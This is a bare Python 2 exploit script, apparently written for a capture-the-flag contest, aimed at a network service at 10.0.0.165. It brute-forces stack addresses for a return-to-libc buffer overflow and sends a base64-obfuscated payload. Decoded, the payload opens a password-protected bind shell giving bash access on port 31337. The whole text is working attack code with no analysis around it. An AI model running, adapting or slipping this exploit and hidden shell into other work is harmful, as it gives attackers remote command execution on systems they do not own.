import struct
import socket

def p(address):
        return struct.pack("<I", address)
# 0xb7e643e0 indirizzo system
# 0xb7e571b0 indirizzo exit
for x in range(0xbfffe000, 0xbfffffff):
        print hex(x)
        cmd = 'python -c \'import base64; exec base64.b64decode("aW1wb3J0IG11bHRpcHJvY2Vzc2luZwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgc29ja2V0CnB3ZCA9ICJKQlpURUFNITIwMTciCmRlZiBwKHMpOgogICAgcy5zZW5kKCJJbnNlcnQgcGFzc3dvcmQgZm9yIEpCWiBURUFNOiAiKQogICAgcGFzc3dkID0gcy5yZWN2KDEwMjQpCiAgICBpZiBwd2QgaW4gcGFzc3dkOgogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oWyJiYXNoIl0sIHN0ZG91dD1zLm1ha2VmaWxlKCksIHN0ZGluPXMubWFrZWZpbGUoKSkud2FpdCgpCiAgICBlbHNlOgogICAgICAgIHJldHVybgpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmJpbmQoKCcnLDMxMzM3KSkKcy5saXN0ZW4oMSkKd2hpbGUgVHJ1ZTogc29jayxhZGRyPXMuYWNjZXB0KCk7IG11bHRpcHJvY2Vzc2luZy5Qcm9jZXNzKHRhcmdldD1wLCBhcmdzPShzb2NrLCkpLnN0YXJ0KCkK")\''
        r = cmd + 'A' * (1036-len(cmd)) + p(0xb7e643e0) + p(0xb7e571b0) + p(x)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.0.0.165', 65099))
        s.send(r)
        s.close()

